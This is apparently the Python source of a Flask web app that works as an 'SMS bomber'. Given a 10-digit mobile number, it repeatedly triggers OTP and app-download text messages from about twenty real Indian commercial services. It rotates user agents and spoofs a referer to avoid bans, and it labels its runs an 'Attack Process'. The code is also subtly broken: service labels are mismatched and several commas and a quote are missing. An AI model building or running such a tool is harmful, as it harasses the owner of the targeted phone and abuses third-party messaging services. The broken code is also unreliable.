import os
import time
import requests
import threading
import random
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

# List of real-world User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    
    while active_tasks.get(mobile):
        # Header rotation for each round
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Referer": "https://www.google.com/"
        }
        
        print(f"\n--- Round {count} Started for {mobile} ---")
        
        # API configurations (List of dictionaries for cleaner execution)
        # Note: 'm' is the method, 'u' is url, 'd' is data/payload, 't' is type (json or data)
        apis = [
            {"name": "JustDial", "m": "GET", "u": f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}"},
            {"name": "ConfirmTkt", "m": "POST", "u": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=", "d": {"mobileNumber": mobile}, "t": "json"},
            {"name": "Housing", "m": "POST", "u": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "d": {"phone": mobile}, "t": "json"},
            {"name": "Ajio", "m": "POST", "u": "https://www.frotels.com/appsendsms.php", "d": {"mobileNumber": mobile}, "t": "json"},
            {"name": "PharmEasy", "m": "POST", "u": "https://www.gapoon.com/userSignup, "d": {"contactNumber": mobile}, "t": "json"},
            {"name": "Treebo", "m": "POST", "u": "https://login.housing.com/api/v2/send-otp", "d": {"phone_number": mobile}, "t": "json"},
            {"name": "Dream11", "m": "POST", "u": "https://porter.in/restservice/send_app_link_sms", "d": {"mobileNum": mobile}, "t": "json"},
            {"name": "Porter", "m": "POST", "u": "https://cityflo.com/website-app-download-link-sms/", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://api.nnnow.com/d/api/appDownloadLink", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://login.web.ajio.com/api/auth/signupSendOTP", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://unacademy.com/api/v1/user/get_app_link/", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://www.treebo.com/api/v2/auth/login/otp/", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://pharmeasy.in/api/auth/requestOTP", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://www.mylescars.com/usermanagements/chkContact", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://grofers.com/v2/accounts/", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://api.dream11.com/sendsmslink", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://www.cashify.in/api/cu01/v1/app-link?mn=", "d": {"phone": mobile}, "t": "json"}
            {"name": "Porter", "m": "POST", "u": "https://commonfront.paytm.com/v4/api/sendsms", "d": {"phone": mobile}, "t": "json"}
          ]

        for api in apis:
            if not active_tasks.get(mobile): break # Stop immediately if requested
            
            try:
                if api["m"] == "GET":
                    res = session.get(api["u"], headers=headers, timeout=5)
                else:
                    if api.get("t") == "json":
                        res = session.post(api["u"], json=api["d"], headers=headers, timeout=5)
                    else:
                        res = session.post(api["u"], data=api["d"], headers=headers, timeout=5)
                
                print(f"[{api['name']}] Status: {res.status_code}")
            except Exception as e:
                print(f"[{api['name']}] Error: Connection Failed")

        print(f"--- Round {count} Finished ---\n")
        count += 1
        time.sleep(15) # Delay to prevent total IP ban

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        t = threading.Thread(target=send_bomber, args=(mobile,))
        t.daemon = True
        t.start()
        return jsonify({"status": "success", "message": f"Attack Process Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    if mobile in active_tasks:
        active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Process Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
